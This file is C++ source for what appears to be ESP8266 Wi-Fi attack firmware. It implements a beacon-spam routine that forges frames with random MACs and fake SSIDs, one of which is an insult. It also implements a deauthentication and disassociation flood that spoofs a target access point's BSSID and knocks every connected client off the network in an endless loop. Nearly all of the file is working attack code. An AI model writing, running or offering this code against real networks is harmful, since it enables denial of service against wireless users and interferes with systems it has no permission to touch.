
#include "Attacks.h"

#define NUM_CHANNELS 3
const uint8_t channels[] = {1, 6, 11}; // commonly used wifi channels on 2.4ghz

#define DEFAULT_NUM_SSIDS 9
char* default_Spam_SSIDs[] = {
  "1) Rock Bottom", 
  "2) Graveyard Shift", 
  "3) Pizza Delivery",
  "4) The Camping Episode", 
  "5) SB-129", 
  "6) Chocolate with Nuts", 
  "7) Bubble Stand",
  "8) The Idiot Box",
  "9) haha fuck you idiot"
};


//beacon packet header
uint8_t beaconPacket[128] = {  
        0x80, 0x00, //Frame Control 
        0x00, 0x00, //Duration
/*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address 
/*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
/*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
/*22*/  0xc0, 0x6c, //Seq-ctl
//Frame body starts here
/*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
/*32*/  0xFF, 0x00, //Beacon interval
/*34*/  0x21, 0x04, //Capability info
/* SSID */
/*36*/  0x00
};                    

uint8_t postSSID[13] = {
        0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
        0x03, 0x01, 0x04
};

uint8_t deauthPacket[DEAUTH_PACKET_SIZE] = {
    /*0 - 1*/  0x00, 0x00, // Frame Control -> Packet type
    /*2 - 3*/  0x00, 0x00, // Duration
    /*4 - 9*/  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast) (all 0xff means to everyone instead of a specific device)
    /*10 - 15*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
    /*16 - 21*/  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
    /*22 - 23*/  0x00, 0x00, // Fragment & Sequence number
    /*24 - 25*/  0x01, 0x00  // Reason code 1 (no reason given)
};

// generic function to handle packet sending
bool sendPacket(uint8_t* packet, uint8_t pktSize){
    int result = wifi_send_pkt_freedom(packet, pktSize, 0);
    return result == 0;
}

void sendBeacon(char* ssids[], uint8_t numSSIDS){
    
    //randomize the source MAC address
    uint8_t randomMac[MAC_ADDR_LEN];
    for(int k=0; k< MAC_ADDR_LEN; k++){
        randomMac[k] = random(256);
    }
    memcpy(&beaconPacket[10], randomMac, MAC_ADDR_LEN);
    memcpy(&beaconPacket[16], randomMac, MAC_ADDR_LEN);

    int ssidSize;
    int packetSize;
    uint32_t packetCount = 0;
    uint32_t time = millis();
    uint32_t lastTime = time;
    uint8_t arrayIndex = 0;

    Serial.println("Spamming SSIDs...");
    while(true){

        ssidSize = strlen(ssids[arrayIndex]);
        packetSize = 38 + ssidSize + sizeof(postSSID);

        beaconPacket[37] = ssidSize;

        //copying SSID into packet an post SSID
        memcpy(&beaconPacket[38], ssids[arrayIndex], ssidSize);
        memcpy(&beaconPacket[38 + ssidSize], postSSID, sizeof(postSSID));

        //looping through every wifi channel
        for(int i=0; i < NUM_CHANNELS ; i++){
            wifi_set_channel(channels[i]);
            beaconPacket[50 + ssidSize] = channels[i];

            packetCount += sendPacket(beaconPacket, packetSize);  
            delay(5);
            
        }

        time = millis();
        if(time - lastTime > 5000){
            Serial.printf("Sent %d packets\n", packetCount);
            lastTime = time;
        }

        arrayIndex = (arrayIndex + 1) % numSSIDS;
    }
}

void defaultSSIDSpam(){
    sendBeacon(default_Spam_SSIDs, DEFAULT_NUM_SSIDS);
}

void customSSIDSpam(){
    String customSSID;
    uint8_t numSSIDLimit;

    Serial.print("Enter Custom SSID to spam: ");
    View::getStrInput(customSSID);

    Serial.print("# of networks spammed: ");
    View::getIntInput(numSSIDLimit);

    char** spam_SSIDS = new char*[numSSIDLimit];

    for (uint8_t i = 0; i < numSSIDLimit; i++){
        String ssid = String(i+1) + ") " + customSSID + " ";
        spam_SSIDS[i] = new char[ssid.length() +1];
        memcpy(spam_SSIDS[i], ssid.c_str(), ssid.length() +1);
    }

    sendBeacon(spam_SSIDS, numSSIDLimit);
}

void beaconSpam() {
    uint8_t menuChoice;

    Serial.println("\nBeacon Spam Menu:\n");
    Serial.println("1: Default spam with ssids from file.");
    Serial.println("2: Custom SSID to spam.");

    View::getIntInput(menuChoice);
    
    switch(menuChoice){
        case 1:
            defaultSSIDSpam(); break;
        case 2:
            customSSIDSpam(); break;
        default:
            Serial.println("Invalid Input");
            break;
    }
}

// void deauthAttack() {
void deauthNetwork(uint8_t targetChannel, uint8_t* targetBSSID){
    Serial.println("Deauthing...");
    wifi_set_channel(targetChannel);

    // initialize deauth packet with target's BSSID
    uint8_t deauthPkt[DEAUTH_PACKET_SIZE];
    memcpy(deauthPkt, deauthPacket, DEAUTH_PACKET_SIZE);
    memcpy(&deauthPkt[10], targetBSSID, MAC_ADDR_LEN);
    memcpy(&deauthPkt[16], targetBSSID, MAC_ADDR_LEN);
    deauthPkt[0] = 0xc0; // change packet type to Deauthenticate

    // initialize disassociate packet from deauth packet
    uint8_t disassociatePkt[DEAUTH_PACKET_SIZE];
    memcpy(disassociatePkt, deauthPkt, DEAUTH_PACKET_SIZE);
    disassociatePkt[0] = 0xa0; // change packet type to Disassociate

    uint32_t packetCount = 0;
    uint32_t time = millis();
    uint32_t lastTime = time;

    //send both packets
    while (true){
        packetCount += sendPacket(deauthPkt, DEAUTH_PACKET_SIZE);
        delay(5);

        packetCount += sendPacket(disassociatePkt, DEAUTH_PACKET_SIZE);
        delay(5);

        time = millis();
        if(time - lastTime > 5000){
            Serial.printf("Sent %d packets\n", packetCount);
            lastTime = time;
        }
    }
}
